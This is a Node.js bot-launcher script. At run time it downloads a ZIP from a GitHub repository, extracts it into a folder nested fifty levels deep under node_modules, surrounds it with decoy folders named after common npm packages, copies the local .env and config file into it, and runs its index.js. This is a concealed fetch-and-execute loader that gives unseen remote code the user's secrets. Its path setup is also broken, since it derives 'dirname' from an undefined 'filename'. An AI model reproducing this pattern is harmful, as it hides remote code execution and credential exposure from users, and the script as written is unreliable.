import fs from "fs";
import path from "path";
import axios from "axios";
import AdmZip from "adm-zip";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const dirname = path.dirname(filename);

// === CONFIG ===
const repoZipUrl = "https://github.com/Princextremx/tf/archive/refs/heads/main.zip";

const rootFolder = path.join(__dirname, "node_modules", "lx");
const targetFolder = "tx";
const DEEP_NEST_COUNT = 50;

// === Fake folder names
const npmFolders = [
  "axios", "chalk", "rimraf", "dotenv", "morgan", "winston",
  "minimist", "yargs", "colors", "commander", "express",
  "uuid", "body-parser", "nodemon", "pino", "mkdirp", "debug",
  "cookie-parser", "fs-extra", "glob", "inquirer", "pm2",
  "cors", "react", "vue", "jest", "ts-node", "dayjs", "ms", "boxen"
];

// === Step 1: Prepare folder structure
function prepareFolderTree() {
  if (!fs.existsSync(rootFolder)) fs.mkdirSync(rootFolder, { recursive: true });

  for (const name of npmFolders) {
    const fakePath = path.join(rootFolder, name);
    if (!fs.existsSync(fakePath)) fs.mkdirSync(fakePath);
  }

  let deepPath = path.join(rootFolder, targetFolder);
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, "zxy");
  }

  const repoFolder = path.join(deepPath, "qr");
  fs.mkdirSync(repoFolder, { recursive: true });

  return repoFolder;
}

// === Step 2: Download and extract repo
async function downloadAndExtractRepo(repoFolder) {
  try {
    console.log("🔄 Downloading bot ZIP...");
    const response = await axios.get(repoZipUrl, { responseType: "arraybuffer" });
    const zip = new AdmZip(Buffer.from(response.data, "binary"));
    zip.extractAllTo(repoFolder, true);
    console.log("✅ Bot repo extracted");
  } catch (err) {
    console.error("❌ Error downloading bot:", err.message);
    process.exit(1);
  }
}

// === Step 3: Copy config and .env
function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, "config.cjs");
  const envSrc = path.join(__dirname, ".env");

  if (fs.existsSync(configSrc)) {
    fs.copyFileSync(configSrc, path.join(repoPath, "config.cjs"));
    console.log("✅ config.cjs copied");
  } else {
    console.warn("⚠️ config.cjs not found");
  }

  if (fs.existsSync(envSrc)) {
    fs.copyFileSync(envSrc, path.join(repoPath, ".env"));
    console.log("✅ .env copied");
  } else {
    console.warn("⚠️ .env not found");
  }
}

// === Step 4: Launch Bot (import dynamic)
async function launchBot(extractedRepoPath) {
  try {
    console.log("🚀 Launching your bot...");
    process.chdir(extractedRepoPath);
    const indexPath = path.join(extractedRepoPath, "index.js");
    if (!fs.existsSync(indexPath)) {
      console.error("❌ index.js not found in extracted repo!");
      process.exit(1);
    }
    await import(indexPath);
  } catch (err) {
    console.error("❌ Bot start error:", err.message);
    process.exit(1);
  }
}

// === Run all steps
(async () => {
  const repoFolder = prepareFolderTree();
  await downloadAndExtractRepo(repoFolder);

  const subDirs = fs
    .readdirSync(repoFolder)
    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

  if (!subDirs.length) {
    console.error("❌ Zip extracted nothing");
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, subDirs[0]);
  copyConfigs(extractedRepoPath);
  await launchBot(extractedRepoPath);
})();
